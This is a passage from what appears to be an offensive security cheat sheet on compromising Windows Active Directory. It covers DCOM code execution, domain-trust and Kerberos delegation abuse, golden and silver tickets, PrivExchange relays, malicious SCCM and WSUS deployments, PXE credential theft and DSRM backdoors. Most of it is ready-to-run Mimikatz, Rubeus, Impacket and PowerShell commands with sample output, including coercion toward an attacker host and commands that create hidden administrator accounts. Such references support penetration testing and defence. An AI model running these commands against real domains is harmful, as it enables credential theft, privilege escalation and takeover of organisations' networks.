CreateObject-\u0026gt;Shell.Application-\u0026gt;ShellExecute CreateObject-\u0026gt;ScriptControl (office-32bit only) Visio.InvisibleApp (same as Visio.Application, but should not show the Visio window) Addons ExecuteLine Word.Application RunAutoMacro # Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM Invoke-Excel4DCOM64.ps1 https://gist.github.com/Philts/85d0f2f0a1cc901d40bbb5b44eb3b4c9 Invoke-ExShellcode.ps1 https://gist.github.com/Philts/f7c85995c5198e845c70cc51cd4e7e2a # Using Excel DDE PS C:\\\u0026gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;Excel.Application\u0026#34;, \u0026#34;$ComputerName\u0026#34;)) PS C:\\\u0026gt; $excel.DisplayAlerts = $false PS C:\\\u0026gt; $excel.DDEInitiate(\u0026#34;cmd\u0026#34;, \u0026#34;/c calc.exe\u0026#34;) # Using Excel RegisterXLL # Can\u0026#39;t be used reliably with a remote target Require: reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\16.0\\Excel\\Security\\Trusted Locations /v AllowsNetworkLocations /t REG_DWORD /d 1 PS\u0026gt; $excel = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;Excel.Application\u0026#34;, \u0026#34;$ComputerName\u0026#34;)) PS\u0026gt; $excel.RegisterXLL(\u0026#34;EvilXLL.dll\u0026#34;) # Using Visio $visio = [activator]::CreateInstance([type]::GetTypeFromProgID(\u0026#34;Visio.InvisibleApp\u0026#34;, \u0026#34;$ComputerName\u0026#34;)) $visio.Addons.Add(\u0026#34;C:\\Windows\\System32\\cmd.exe\u0026#34;).Run(\u0026#34;/c calc\u0026#34;) DCOM via ShellExecute # $com = [Type]::GetTypeFromCLSID(\u0026#39;9BA05972-F6A8-11CF-A442-00A0C90A8F39\u0026#39;,\u0026#34;10.10.10.1\u0026#34;) $obj = [System.Activator]::CreateInstance($com) $item = $obj.Item() $item.Document.Application.ShellExecute(\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c calc.exe\u0026#34;,\u0026#34;C:\\windows\\system32\u0026#34;,$null,0) DCOM via ShellBrowserWindow # :warning: Windows 10 only, the object doesn\u0026rsquo;t exists in Windows 7\n$com = [Type]::GetTypeFromCLSID(\u0026#39;C08AFD90-F2A1-11D1-8455-00A0C91F3880\u0026#39;,\u0026#34;10.10.10.1\u0026#34;) $obj = [System.Activator]::CreateInstance($com) $obj.Application.ShellExecute(\u0026#34;cmd.exe\u0026#34;,\u0026#34;/c calc.exe\u0026#34;,\u0026#34;C:\\windows\\system32\u0026#34;,$null,0) Trust relationship between domains # One-way Domain B trusts A Users in Domain A can access resources in Domain B Users in Domain B cannot access resources in Domain A Two-way Domain A trusts Domain B Domain B trusts Domain A Authentication requests can be passed between the two domains in both directions Enumerate trusts between domains # nltest /trusted_domains or\n([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships() SourceName TargetName TrustType TrustDirection ---------- ---------- --------- -------------- domainA.local domainB.local TreeRoot Bidirectional Exploit trusts between domains # :warning: Require a Domain-Admin level access to the current domain.\nSource Target Technique to use Trust relationship Root Child Golden Ticket + Enterprise Admin group (Mimikatz /groups) Inter Realm (2-way) Child Child SID History exploitation (Mimikatz /sids) Inter Realm Parent-Child (2-way) Child Root SID History exploitation (Mimikatz /sids) Inter Realm Tree-Root (2-way) Forest A Forest B PrinterBug + Unconstrained delegation ? Inter Realm Forest or External (2-way) Child Domain to Forest Compromise - SID Hijacking # Most trees are linked with dual sided trust relationships to allow for sharing of resources. By default the first domain created if the Forest Root.\nRequirements:\nKRBTGT Hash Find the SID of the domain $ Convert-NameToSid target.domain.com\\krbtgt S-1-5-21-2941561648-383941485-1389968811-502 # with Impacket lookupsid.py domain/user:password@10.10.10.10 Replace 502 with 519 to represent Enterprise Admins Create golden ticket and attack parent domain. kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt Forest to Forest Compromise - Trust Ticket # Require: SID filtering disabled From the DC, dump the hash of the currentdomain\\targetdomain$ trust account using Mimikatz (e.g. with LSADump or DCSync). Then, using this trust key and the domain SIDs, forge an inter-realm TGT using Mimikatz, adding the SID for the target domain\u0026rsquo;s enterprise admins group to our SID history.\nDumping trust passwords (trust keys) # Look for the trust name with a dollar ($) sign at the end. Most of the accounts with a trailing $ are computer accounts, but some are trust accounts.\nlsadump::trust /patch or find the TRUST_NAME$ machine account hash Create a forged trust ticket (inter-realm TGT) using Mimikatz # mimikatz(commandline) # kerberos::golden /domain:domain.local /sid:S-1-5-21... /rc4:HASH_TRUST$ /user:Administrator /service:krbtgt /target:external.com /ticket:c:\\temp\\trust.kirbi mimikatz(commandline) # kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:e4e47c8fc433c9e0f3b17ea74856ca6b /user:Administrator /service:krbtgt /target:moneycorp.local /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi Use the Trust Ticket file to get a ST for the targeted service # .\\asktgs.exe c:\\temp\\trust.kirbi CIFS/machine.domain.local .\\Rubeus.exe asktgs /ticket:c:\\ad\\tools\\mcorp-ticket.kirbi /service:LDAP/mcorp-dc.moneycorp.local /dc:mcorp-dc.moneycorp.local /ptt Inject the ST file and access the targeted service with the spoofed rights.\nkirbikator lsa .\\ticket.kirbi ls \\\\machine.domain.local\\c$ Privileged Access Management (PAM) Trust # Require: Windows Server 2016 or earlier\nIf we compromise the bastion we get Domain Admins privileges on the other domain\nDefault configuration for PAM Trust # execute on our forest netdom trust lab.local /domain:bastion.local /ForestTransitive:Yes netdom trust lab.local /domain:bastion.local /EnableSIDHistory:Yes netdom trust lab.local /domain:bastion.local /EnablePIMTrust:Yes netdom trust lab.local /domain:bastion.local /Quarantine:No # execute on our bastion netdom trust bastion.local /domain:lab.local /ForestTransitive:Yes Enumerate # Using ADModule Get-ADTrust -Filter {(ForestTransitive -eq $True) -and (SIDFilteringQuarantined -eq $False)} # Enumerate shadow security principals Get-ADObject -SearchBase (\u0026#34;CN=Shadow Principal Configuration,CN=Services,\u0026#34; + (Get-ADRootDSE).configurationNamingContext) -Filter * -Properties * | select Name,member,msDS-ShadowPrincipalSid | fl Compromise Using SID History Using the previously found Shadow Security Principal Kerberos Unconstrained Delegation # The user sends a ST to access the service, along with their TGT, and then the service can use the user\u0026rsquo;s TGT to request a ST for the user to any other service and impersonate the user. - https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\nWhen a user authenticates to a computer that has unrestricted kerberos delegation privilege turned on, authenticated user\u0026rsquo;s TGT ticket gets saved to that computer\u0026rsquo;s memory.\n:warning: Unconstrained delegation used to be the only option available in Windows 2000\nSpoolService Abuse with Unconstrained Delegation # The goal is to gain DC Sync privileges using a computer account and the SpoolService bug.\nRequirements:\nObject with Property Trust this computer for delegation to any service (Kerberos only) Must have ADS_UF_TRUSTED_FOR_DELEGATION Must not have ADS_UF_NOT_DELEGATED flag User must not be in the Protected Users group User must not have the flag Account is sensitive and cannot be delegated Find delegation # :warning: : Domain controllers usually have unconstrained delegation enabled. Check the TrustedForDelegation property.\nADModule\n# From https://github.com/samratashok/ADModule PS\u0026gt; Get-ADComputer -Filter {TrustedForDelegation -eq $True} ldapdomaindump\n$\u0026gt; ldapdomaindump -u \u0026#34;DOMAIN\\\\Account\u0026#34; -p \u0026#34;Password123*\u0026#34; 10.10.10.10 grep TRUSTED_FOR_DELEGATION domain_computers.grep CrackMapExec module\ncme ldap 10.10.10.10 -u username -p password --trusted-for-delegation SpoolService status # Check if the spool service is running on the remote host\nls \\\\dc01\\pipe\\spoolss python rpcdump.py DOMAIN/user:password@10.10.10.10 Monitor with Rubeus # Monitor incoming connections from Rubeus.\nRubeus.exe monitor /interval:1 Force a connect back from the DC # Due to the unconstrained delegation, the TGT of the computer account (DC$) will be saved in the memory of the computer with unconstrained delegation. By default the domain controller computer account has DCSync rights over the domain object.\nSpoolSample is a PoC to coerce a Windows host to authenticate to an arbitrary server using a \u0026ldquo;feature\u0026rdquo; in the MS-RPRN RPC interface.\n# From https://github.com/leechristensen/SpoolSample .\\SpoolSample.exe VICTIM-DC-NAME UNCONSTRAINED-SERVER-DC-NAME .\\SpoolSample.exe DC01.HACKER.LAB HELPDESK.HACKER.LAB # DC01.HACKER.LAB is the domain controller we want to compromise # HELPDESK.HACKER.LAB is the machine with delegation enabled that we control. # From https://github.com/dirkjanm/krbrelayx printerbug.py \u0026#39;domain/username:password\u0026#39;@\u0026lt;VICTIM-DC-NAME\u0026gt; \u0026lt;UNCONSTRAINED-SERVER-DC-NAME\u0026gt; # From https://gist.github.com/3xocyte/cfaf8a34f76569a8251bde65fe69dccc#gistcomment-2773689 python dementor.py -d domain -u username -p password \u0026lt;UNCONSTRAINED-SERVER-DC-NAME\u0026gt; \u0026lt;VICTIM-DC-NAME\u0026gt; If the attack worked you should get a TGT of the domain controller.\nLoad the ticket # Extract the base64 TGT from Rubeus output and load it to our current session.\n.\\Rubeus.exe asktgs /ticket:\u0026lt;ticket base64\u0026gt; /ptt Alternatively you could also grab the ticket using Mimikatz : mimikatz # sekurlsa::tickets\nThen you can use DCsync or another attack : mimikatz # lsadump::dcsync /user:HACKER\\krbtgt\nMitigation # Ensure sensitive accounts cannot be delegated Disable the Print Spooler Service MS-EFSRPC Abuse with Unconstrained Delegation # Using PetitPotam, another tool to coerce a callback from the targeted machine, instead of SpoolSample.\n# Coerce the callback git clone https://github.com/topotam/PetitPotam python3 petitpotam.py -d $DOMAIN -u $USER -p $PASSWORD $ATTACKER_IP $TARGET_IP python3 petitpotam.py -d \u0026#39;\u0026#39; -u \u0026#39;\u0026#39; -p \u0026#39;\u0026#39; $ATTACKER_IP $TARGET_IP # Extract the ticket .\\Rubeus.exe asktgs /ticket:\u0026lt;ticket base64\u0026gt; /ptt Kerberos Constrained Delegation # Request a Kerberos ticket which allows us to exploit delegation configurations, we can once again use Impackets getST.py script, however,\nPassing the -impersonate flag and specifying the user we wish to impersonate (any valid username).\n# Discover $ Get-DomainComputer -TrustedToAuth | select -exp dnshostname # Find the service $ Get-DomainComputer previous_result | select -exp msds-AllowedToDelegateTo Exploit the Constrained Delegation # Impacket $ getST.py -spn HOST/SQL01.DOMAIN \u0026#39;DOMAIN/user:password\u0026#39; -impersonate Administrator -dc-ip 10.10.10.10 Rubeus $ ./Rubeus.exe tgtdeleg /nowrap # this ticket can be used with /ticket:... $ ./Rubeus.exe s4u /user:user_for_delegation /rc4:user_pwd_hash /impersonateuser:user_to_impersonate /domain:domain.com /dc:dc01.domain.com /msdsspn:cifs/srv01.domain.com /ptt $ ./Rubeus.exe s4u /user:MACHINE$ /rc4:MACHINE_PWD_HASH /impersonateuser:Administrator /msdsspn:\u0026#34;cifs/dc.domain.com\u0026#34; /altservice:cifs,http,host,rpcss,wsman,ldap /ptt $ dir \\\\dc.domain.com\\c$ Impersonate a domain user on a resource # Require:\nSYSTEM level privileges on a machine configured with constrained delegation PS\u0026gt; [Reflection.Assembly]::LoadWithPartialName(\u0026#39;System.IdentityModel\u0026#39;) | out-null PS\u0026gt; $idToImpersonate = New-Object System.Security.Principal.WindowsIdentity @(\u0026#39;administrator\u0026#39;) PS\u0026gt; $idToImpersonate.Impersonate() PS\u0026gt; [System.Security.Principal.WindowsIdentity]::GetCurrent() | select name PS\u0026gt; ls \\\\dc01.offense.local\\c$ Kerberos Resource Based Constrained Delegation # Resource-based Constrained Delegation was introduced in Windows Server 2012.\nThe user sends a Service Ticket (ST) to access the service (\u0026ldquo;Service A\u0026rdquo;), and if the service is allowed to delegate to another pre-defined service (\u0026ldquo;Service B\u0026rdquo;), then Service A can present to the authentication service the TGS that the user provided and obtain a ST for the user to Service B. https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html\nImport Powermad and Powerview\nPowerShell.exe -ExecutionPolicy Bypass Import-Module .\\powermad.ps1 Import-Module .\\powerview.ps1 Get user SID\n$AttackerSID = Get-DomainUser SvcJoinComputerToDom -Properties objectsid | Select -Expand objectsid $ACE = Get-DomainObjectACL dc01-ww2.factory.lan | ?{$_.SecurityIdentifier -match $AttackerSID} $ACE ConvertFrom-SID $ACE.SecurityIdentifier Abuse MachineAccountQuota to create a computer account and set an SPN for it\nNew-MachineAccount -MachineAccount swktest -Password $(ConvertTo-SecureString \u0026#39;Weakest123*\u0026#39; -AsPlainText -Force) Rewrite DC\u0026rsquo;s AllowedToActOnBehalfOfOtherIdentity properties\n$ComputerSid = Get-DomainComputer swktest -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))\u0026#34; $SDBytes = New-Object byte[] ($SD.BinaryLength) $SD.GetBinaryForm($SDBytes, 0) Get-DomainComputer dc01-ww2.factory.lan | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} $RawBytes = Get-DomainComputer dc01-ww2.factory.lan -Properties \u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39; | select -expand msds-allowedtoactonbehalfofotheridentity $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0 $Descriptor.DiscretionaryAcl # alternative $SID_FROM_PREVIOUS_COMMAND = Get-DomainComputer MACHINE_ACCOUNT_NAME -Properties objectsid | Select -Expand objectsid $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList \u0026#34;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$SID_FROM_PREVIOUS_COMMAND)\u0026#34;; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0); Get-DomainComputer DC01 | Set-DomainObject -Set @{\u0026#39;msds-allowedtoactonbehalfofotheridentity\u0026#39;=$SDBytes} # alternative StandIn_Net35.exe --computer dc01 --sid SID_FROM_PREVIOUS_COMMAND Use Rubeus to get hash from password\nRubeus.exe hash /password:\u0026#39;Weakest123*\u0026#39; /user:swktest$ /domain:factory.lan [*] Input password : Weakest123* [*] Input username : swktest$ [*] Input domain : factory.lan [*] Salt : FACTORY.LANswktest [*] rc4_hmac : F8E064CA98539B735600714A1F1907DD [*] aes128_cts_hmac_sha1 : D45DEADECB703CFE3774F2AA20DB9498 [*] aes256_cts_hmac_sha1 : 0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 [*] des_cbc_md5 : BA297CFD07E62A5E Impersonate domain admin using our newly created machine account\n.\\Rubeus.exe s4u /user:swktest$ /rc4:F8E064CA98539B735600714A1F1907DD /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap .\\Rubeus.exe s4u /user:swktest$ /aes256:0129D24B2793DD66BAF3E979500D8B313444B4D3004DE676FA6AFEAC1AC5C347 /impersonateuser:Administrator /msdsspn:cifs/dc01-ww2.factory.lan /ptt /altservice:cifs,http,host,rpcss,wsman,ldap [*] Impersonating user \u0026#39;Administrator\u0026#39; to target SPN \u0026#39;cifs/dc01-ww2.factory.lan\u0026#39; [*] Using domain controller: DC01-WW2.factory.lan (172.16.42.5) [*] Building S4U2proxy request for service: \u0026#39;cifs/dc01-ww2.factory.lan\u0026#39; [*] Sending S4U2proxy request [+] S4U2proxy success! [*] base64(ticket.kirbi) for SPN \u0026#39;cifs/dc01-ww2.factory.lan\u0026#39;: doIGXDCCBligAwIBBaEDAgEWooIFXDCCBVhhggVUMIIFUKADAgEFoQ0bC0ZBQ1RPUlkuTEFOoicwJaAD AgECoR4wHBsEY2lmcxsUZGMwMS[...]PMIIFC6ADAgESoQMCAQOiggT9BIIE LmZhY3RvcnkubGFu [*] Action: Import Ticket [+] Ticket successfully imported! Kerberos Bronze Bit Attack - CVE-2020-17049 # An attacker can impersonate users which are not allowed to be delegated. This includes members of the Protected Users group and any other users explicitly configured as sensitive and cannot be delegated.\nPatch is out on November 10, 2020, DC are most likely vulnerable until February 2021.\n:warning: Patched Error Message : [-] Kerberos SessionError: KRB_AP_ERR_MODIFIED(Message stream modified)\nRequirements:\nService account\u0026rsquo;s password hash Service account\u0026rsquo;s with Constrained Delegation or Resource Based Constrained Delegation Impacket PR #1013 Attack #1 - Bypass the Trust this user for delegation to specified services only – Use Kerberos only protection and impersonate a user who is protected from delegation.\n# forwardable flag is only protected by the ticket encryption which uses the service account\u0026#39;s password $ getST.py -spn cifs/Service2.test.local -impersonate Administrator -hashes \u0026lt;LM:NTLM hash\u0026gt; -aesKey \u0026lt;AES hash\u0026gt; test.local/Service1 -force-forwardable -dc-ip \u0026lt;Domain controller\u0026gt; # -\u0026gt; Forwardable $ getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes aad3b435b51404eeaad3b435b51404ee:7c1673f58e7794c77dead3174b58b68f -aesKey 4ffe0c458ef7196e4991229b0e1c4a11129282afb117b02dc2f38f0312fc84b4 test.local/Service1 -force-forwardable # Load the ticket .\\mimikatz\\mimikatz.exe \u0026#34;kerberos::ptc User2.ccache\u0026#34; exit # Access \u0026#34;c$\u0026#34; ls \\\\service2.test.local\\c$ Attack #2 - Write Permissions to one or more objects in the AD\n# Create a new machine account Import-Module .\\Powermad\\powermad.ps1 New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString \u0026#39;AttackerServicePassword\u0026#39; -AsPlainText -Force) .\\mimikatz\\mimikatz.exe \u0026#34;kerberos::hash /password:AttackerServicePassword /user:AttackerService /domain:test.local\u0026#34; exit # Set PrincipalsAllowedToDelegateToAccount Install-WindowsFeature RSAT-AD-PowerShell Import-Module ActiveDirectory Get-ADComputer AttackerService Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount # Execute the attack python .\\impacket\\examples\\getST.py -spn cifs/Service2.test.local -impersonate User2 -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local/AttackerService -force-forwardableet-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$ # Load the ticket .\\mimikatz\\mimikatz.exe \u0026#34;kerberos::ptc User2.ccache\u0026#34; exit | Out-Null PrivExchange attack # Exchange your privileges for Domain Admin privs by abusing Exchange. :warning: You need a shell on a user account with a mailbox.\nExchange server hostname or IP address\npth-net rpc group members \u0026#34;Exchange Servers\u0026#34; -I dc01.domain.local -U domain/username Relay of the Exchange server authentication and privilege escalation (using ntlmrelayx from Impacket).\nntlmrelayx.py -t ldap://dc01.domain.local --escalate-user username Subscription to the push notification feature (using privexchange.py or powerPriv), uses the credentials of the current user to authenticate to the Exchange server. Forcing the Exchange server\u0026rsquo;s to send back its NTLMv2 hash to a controlled machine.\n# https://github.com/dirkjanm/PrivExchange/blob/master/privexchange.py python privexchange.py -ah xxxxxxx -u xxxx -d xxxxx python privexchange.py -ah 10.0.0.2 mail01.domain.local -d domain.local -u user_exchange -p pass_exchange # https://github.com/G0ldenGunSec/PowerPriv powerPriv -targetHost corpExch01 -attackerHost 192.168.1.17 -Version 2016 Profit using secretdumps from Impacket, the user can now perform a dcsync and get another user\u0026rsquo;s NTLM hash\npython secretsdump.py xxxxxxxxxx -just-dc python secretsdump.py lab/buff@192.168.0.2 -ntds ntds -history -just-dc-ntlm Clean your mess and restore a previous state of the user\u0026rsquo;s ACL\npython aclpwn.py --restore ../aclpwn-20190319-125741.restore Alternatively you can use the Metasploit module\nuse auxiliary/scanner/http/exchange_web_server_pushsubscription\nAlternatively you can use an all-in-one tool : Exchange2domain.\ngit clone github.com/Ridter/Exchange2domain python Exchange2domain.py -ah attackterip -ap listenport -u user -p password -d domain.com -th DCip MailServerip python Exchange2domain.py -ah attackterip -u user -p password -d domain.com -th DCip --just-dc-user krbtgt MailServerip SCCM Deployment # SCCM is a solution from Microsoft to enhance administration in a scalable way across an organisation.\nPowerSCCM - PowerShell module to interact with SCCM deployments\nMalSCCM - Abuse local or remote SCCM servers to deploy malicious applications to hosts they manage\nCompromise client, use locate to find management server\nMalSCCM.exe locate Enumerate over WMI as an administrator of the Distribution Point\nMalSCCM.exe inspect /server:\u0026lt;DistributionPoint Server FQDN\u0026gt; /groups Compromise management server, use locate to find primary server\nUse inspect on primary server to view who you can target\nMalSCCM.exe inspect /all MalSCCM.exe inspect /computers MalSCCM.exe inspect /primaryusers MalSCCM.exe inspect /groups Create a new device group for the machines you want to laterally move too\nMalSCCM.exe group /create /groupname:TargetGroup /grouptype:device MalSCCM.exe inspect /groups Add your targets into the new group\nMalSCCM.exe group /addhost /groupname:TargetGroup /host:WIN2016-SQL Create an application pointing to a malicious EXE on a world readable share : SCCMContentLib$\nMalSCCM.exe app /create /name:demoapp /uncpath:\u0026#34;\\\\BLORE-SCCM\\SCCMContentLib$\\localthread.exe\u0026#34; MalSCCM.exe inspect /applications Deploy the application to the target group\nMalSCCM.exe app /deploy /name:demoapp /groupname:TargetGroup /assignmentname:demodeployment MalSCCM.exe inspect /deployments Force the target group to checkin for updates\nMalSCCM.exe checkin /groupname:TargetGroup Cleanup the application, deployment and group\nMalSCCM.exe app /cleanup /name:demoapp MalSCCM.exe group /delete /groupname:TargetGroup SCCM Network Access Accounts # If you can escalate on a host that is an SCCM client, you can retrieve plaintext domain credentials.\nFind SCCM blob Get-Wmiobject -namespace \u0026#34;root\\ccm\\policy\\Machine\\ActualConfig\u0026#34; -class \u0026#34;CCM_NetworkAccessAccount\u0026#34; NetworkAccessPassword : \u0026lt;![CDATA[E600000001...8C6B5]]\u0026gt; NetworkAccessUsername : \u0026lt;![CDATA[E600000001...00F92]]\u0026gt; Using SharpDPAPI for SCCM retrieval and decryption .\\SharpDPAPI.exe SCCM Check ACL for the CIM repository located at C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA: Get-Acl C:\\Windows\\System32\\wbem\\Repository\\OBJECTS.DATA | Format-List -Property PSPath,sddl ConvertFrom-SddlString \u0026#34;\u0026#34; WSUS Deployment # Windows Server Update Services (WSUS) enables information technology administrators to deploy the latest Microsoft product updates. You can use WSUS to fully manage the distribution of updates that are released through Microsoft Update to computers on your network\n:warning: The payload must be a Microsoft signed binary and must point to a location on disk for the WSUS server to load that binary.\nSharpWSUS Locate using HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\WindowsUpdate or SharpWSUS.exe locate After WSUS Server compromise: SharpWSUS.exe inspect Create a malicious patch: SharpWSUS.exe create /payload:\u0026quot;C:\\Users\\ben\\Documents\\pk\\psexec.exe\u0026quot; /args:\u0026quot;-accepteula -s -d cmd.exe /c \\\u0026quot;net user WSUSDemo Password123! /add ^\u0026amp; net localgroup administrators WSUSDemo /add\\\u0026quot;\u0026quot; /title:\u0026quot;WSUSDemo\u0026quot; Deploy it on the target: SharpWSUS.exe approve /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:\u0026quot;Demo Group\u0026quot; Check status deployment: SharpWSUS.exe check /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local Clean up: SharpWSUS.exe delete /updateid:5d667dfd-c8f0-484d-8835-59138ac0e127 /computername:bloredc2.blorebank.local /groupname:”Demo Group RODC - Read Only Domain Controller Compromise # If the user is included in the Allowed RODC Password Replication, their credentials are stored in the server, and the msDS-RevealedList attribute of the RODC is populated with the username.\nRequirements:\nImpacket PR #1210 - The Kerberos Key List Attack krbtgt credentials of the RODC (-rodcKey) ID of the krbtgt account of the RODC (-rodcNo) Exploitation:\n# keylistattack.py using SAMR user enumeration without filtering (-full flag) keylistattack.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -full # keylistattack.py defining a target username (-t flag) keylistattack.py -kdc sever.domain.local -t user -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX LIST # secretsdump.py using the Kerberos Key List Attack option (-use-keylist) secretsdump.py DOMAIN/user:password@host -rodcNo XXXXX -rodcKey XXXXXXXXXXXXXXXXXXXX -use-keylist PXE Boot image attack # PXE allows a workstation to boot from the network by retrieving an operating system image from a server using TFTP (Trivial FTP) protocol. This boot over the network allows an attacker to fetch the image and interact with it.\nPress [F8] during the PXE boot to spawn an administrator console on the deployed machine.\nPress [SHIFT+F10] during the initial Windows setup process to bring up a system console, then add a local administrator or dump SAM/SYSTEM registry.\nnet user hacker Password123! /add net localgroup administrators /add hacker Extract the pre-boot image (wim files) using PowerPXE.ps1 (https://github.com/wavestone-cdt/powerpxe) and dig through it to find default passwords and domain accounts.\n# Import the module PS \u0026gt; Import-Module .\\PowerPXE.ps1 # Start the exploit on the Ethernet interface PS \u0026gt; Get-PXEcreds -InterfaceAlias Ethernet PS \u0026gt; Get-PXECreds -InterfaceAlias « lab 0 » # Wait for the DHCP to get an address \u0026gt;\u0026gt; Get a valid IP address \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; DHCP proposal IP address: 192.168.22.101 \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; DHCP Validation: DHCPACK \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; IP address configured: 192.168.22.101 # Extract BCD path from the DHCP response \u0026gt;\u0026gt; Request BCD File path \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; BCD File path: \\Tmp\\x86x64{5AF4E332-C90A-4015-9BA2-F8A7C9FF04E6}.bcd \u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt; TFTP IP Address: 192.168.22.3 # Download the BCD file and extract wim files \u0026gt;\u0026gt; Launch TFTP download \u0026gt;\u0026gt;\u0026gt;\u0026gt; Transfer succeeded. \u0026gt;\u0026gt; Parse the BCD file: conf.bcd \u0026gt;\u0026gt;\u0026gt;\u0026gt; Identify wim file : \\Boot\\x86\\Images\\LiteTouchPE_x86.wim \u0026gt;\u0026gt;\u0026gt;\u0026gt; Identify wim file : \\Boot\\x64\\Images\\LiteTouchPE_x64.wim \u0026gt;\u0026gt; Launch TFTP download \u0026gt;\u0026gt;\u0026gt;\u0026gt; Transfer succeeded. # Parse wim files to find interesting data \u0026gt;\u0026gt; Open LiteTouchPE_x86.wim \u0026gt;\u0026gt;\u0026gt;\u0026gt; Finding Bootstrap.ini \u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt;\u0026gt; DeployRoot = \\\\LAB-MDT\\DeploymentShare$ \u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt;\u0026gt; UserID = MdtService \u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026gt;\u0026gt;\u0026gt;\u0026gt; UserPassword = Somepass1 DNS Reconnaissance # Perform ADIDNS searches\nStandIn.exe --dns --limit 20 StandIn.exe --dns --filter SQL --limit 10 StandIn.exe --dns --forest --domain redhook --user RFludd --pass Cl4vi$Alchemi4e StandIn.exe --dns --legacy --domain redhook --user RFludd --pass Cl4vi$Alchemi4e DSRM Credentials # Directory Services Restore Mode (DSRM) is a safe mode boot option for Windows Server domain controllers. DSRM allows an administrator to repair or recover to repair or restore an Active Directory database.\nThis is the local administrator account inside each DC. Having admin privileges in this machine, you can use mimikatz to dump the local Administrator hash. Then, modifying a registry to activate this password so you can remotely access to this local Administrator user.\nInvoke-Mimikatz -Command \u0026#39;\u0026#34;token::elevate\u0026#34; \u0026#34;lsadump::sam\u0026#34;\u0026#39; # Check if the key exists and get the value Get-ItemProperty \u0026#34;HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\u0026#34; -name DsrmAdminLogonBehavior # Create key with value \u0026#34;2\u0026#34; if it doesn\u0026#39;t exist New-ItemProperty \u0026#34;HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\u0026#34; -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD # Change value to \u0026#34;2\u0026#34; Set-ItemProperty \u0026#34;HKLM:\\SYSTEM\\CURRENTCONTROLSET\\CONTROL\\LSA\u0026#34; -name DsrmAdminLogonBehavior -value 2 Impersonating Office 365 Users on Azure AD Connect # Prerequisites:\nObtain NTLM password hash of the AZUREADSSOACC account\nmimikatz.exe \u0026#34;lsadump::dcsync /user:AZUREADSSOACC$\u0026#34; exit AAD logon name of the user we want to impersonate (userPrincipalName or mail)\nelrond@contoso.com SID of the user we want to impersonate\nS-1-5-21-2121516926-2695913149-3163778339-1234 Create the Silver Ticket and inject it into Kerberos cache:\nmimikatz.exe \u0026#34;kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt\u0026#34; exit Launch Mozilla Firefox, go to about:config\nnetwork.negotiate-auth.trusted-uris=\u0026#34;https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com\u0026#34;. Navigate to any web application that is integrated with our AAD domain. Once at the Office365 logon screen, fill in the user name, while leaving the password field empty. Then press TAB or ENTER.\nLinux Active Directory # CCACHE ticket reuse from /tmp # When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions\nList the current ticket 